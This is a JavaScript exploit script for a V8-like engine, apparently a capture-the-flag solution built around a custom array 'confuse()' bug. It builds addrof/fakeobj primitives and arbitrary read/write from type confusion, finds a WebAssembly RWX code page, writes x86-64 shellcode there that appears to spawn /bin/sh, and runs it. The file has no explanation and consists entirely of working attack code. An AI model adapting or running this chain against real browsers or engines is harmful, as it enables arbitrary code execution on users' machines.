var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function itof64(val_low, val_high) { 
    var lower = Number(val_low);
    var upper = Number(val_high);
    u64_buf[0] = lower;
    u64_buf[1] = upper;
    return f64_buf[0];
}

function toHex(value) {
    return "0x" + value.toString(16);
}


function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x24n-8n;

    arbWrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	    dataview.setUint32(4*i, shellcode[i], true);
    }
}

// ----------------- addrof/fakeobj -----------

let a = ["A", "B"];

function addrof(in_obj){
	a[0] = in_obj
	a.confuse();
	let ret = ftoi(a[0]) & 0xffffffffn;
	a[0] = "A";
	a.confuse();
	return ret;
}

function fakeobj(addr){
	let f_arr = [1.1, 1.2, 1.3, 1.4, 1.5];
	f_arr[0] = itof(addr);
	f_arr.confuse();
	let fake = f_arr[0];
	return fake;
}

// ---------- arbRead/arbWrite ----------------

let fake_array_map = [itof(0x31040404001c0201n), itof(0x0a0007ff11000844n), itof(0x001cb82d001cb1c5n), itof(0x00000735001cb7f9n)];

function arbRead(addr) {
    if (addr % 2n == 0)
        addr += 1n;

	let fake_obj = [itof64(addrof(fake_array_map)+0x44n, 0), itof64(addr, 0x8)];
    let fake = fakeobj(addrof(fake_obj)+0x90n);
    
    return ftoi(fake[0]);
}

function arbWrite(addr, value) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake_obj = [itof64(addrof(fake_array_map)+0x44n, 0), itof64(addr, 0x8)];
    let fake = fakeobj(addrof(fake_obj)+0x90n); 

    fake[0] = itof(value);
}

// ------------------- get shell ----------

let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d,
    0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a,
    0x0b]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;


let wasm_inst_addr = addrof(wasm_instance);
let trusted_data_ptr = wasm_inst_addr + 0xcn;
let trusted_data = arbRead(trusted_data_ptr - 0x8n) & 0xffffffffn;

console.log("Wasm instance address: " + toHex(wasm_inst_addr));
console.log("Trusted data pointer: " + toHex(trusted_data_ptr));
console.log("Trusted data: " + toHex(trusted_data));

var rwx_ptr = trusted_data + 0x28n - 1n;
var rwx_base = arbRead(rwx_ptr);
console.log("RWX pointer: " + toHex(rwx_ptr));
console.log("RWX base address: " + toHex(rwx_base));

var shellcode = [0x90909090, 0x90909090, 0xb848686a, 0x6e69622f, 0x732f2f2f, 0xe7894850, 0x01697268, 0x24348101, 0x01010101, 0x6a56f631, 0x01485e08, 0x894856e6, 0x6ad231e6, 0x050f583b];
console.log("[+] Copying Shellcode...");
copy_shellcode(rwx_base, shellcode);
console.log("[+] Running Shellcode...");

f();
